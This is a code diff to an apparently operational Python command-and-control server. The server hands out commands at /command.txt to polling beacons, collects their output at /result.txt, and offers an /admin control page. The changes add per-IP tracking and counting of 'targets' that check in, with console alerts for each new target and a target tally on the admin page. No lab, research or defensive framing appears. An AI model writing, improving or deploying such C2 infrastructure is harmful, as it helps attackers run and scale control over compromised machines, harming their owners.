@@ -30,6 +30,9 @@ def load_command():
     with open(COMMAND_FILE, "r") as f:
         return f.read().strip()
 
+seen_targets = set()
+seen_targets_lock = threading.Lock()
+
 def cleanup_old_logs():
     if not os.path.exists(RESULT_FILE):
         return
@@ -88,12 +91,24 @@ def periodic_log_cleanup():
         time.sleep(60)
         cleanup_old_logs()
 
+def print_target_count():
+    while True:
+        time.sleep(30)
+        with seen_targets_lock:
+            print(f"[{datetime.now().strftime('%H:%M:%S')}] Targets: {len(seen_targets)}")
+
 class C2Handler(http.server.BaseHTTPRequestHandler):
     def do_GET(self):
         parsed = urlparse(self.path)
         path = parsed.path
 
         if path == "/command.txt":
+            client_ip = self.client_address[0]
+            with seen_targets_lock:
+                if client_ip not in seen_targets:
+                    seen_targets.add(client_ip)
+                    print(f"[{datetime.now().strftime('%H:%M:%S')}] New target: {client_ip} (total: {len(seen_targets)})")
+
             command = load_command()
             self.send_response(200)
             self.send_header("Content-Type", "text/plain")
@@ -105,6 +120,8 @@ class C2Handler(http.server.BaseHTTPRequestHandler):
 
         elif path == "/admin":
             command = load_command()
+            with seen_targets_lock:
+                target_count = len(seen_targets)
             html = f"""<!DOCTYPE html>
 <html>
 <head>
@@ -132,8 +149,7 @@ pre {{ white-space: pre-wrap; word-break: break-all; }}
 </form>
 <div class="status">
 <p>current command: <strong>{self._escape(command)}</strong></p>
-<p>beacon polls every 30s</p>
-<p>log retention: <strong>{LOG_RETENTION_MINUTES} minutes</strong></p>
+<p>targets: <strong>{target_count}</strong> &nbsp;|&nbsp; beacon polls every 30s &nbsp;|&nbsp; log retention: <strong>{LOG_RETENTION_MINUTES} minutes</strong></p>
 </div>
 <div class="output">
 <p><strong>recent beacon output ({LOG_RETENTION_MINUTES} min window):</strong></p>
@@ -201,6 +217,12 @@ pre {{ white-space: pre-wrap; word-break: break-all; }}
             self.end_headers()
 
         elif path == "/result.txt":
+            client_ip = self.client_address[0]
+            with seen_targets_lock:
+                if client_ip not in seen_targets:
+                    seen_targets.add(client_ip)
+                    print(f"[{datetime.now().strftime('%H:%M:%S')}] New target: {client_ip} (total: {len(seen_targets)})")
+
             content_length = int(self.headers.get("Content-Length", 0))
             body = self.rfile.read(content_length).decode()
             params = parse_qs(body)
@@ -270,6 +292,9 @@ if __name__ == "__main__":
 
     cleanup_thread = threading.Thread(target=periodic_log_cleanup, daemon=True)
     cleanup_thread.start()
+
+    status_thread = threading.Thread(target=print_target_count, daemon=True)
+    status_thread.start()
 
     server = ThreadedHTTPServer(("0.0.0.0", PORT), C2Handler)
     try:
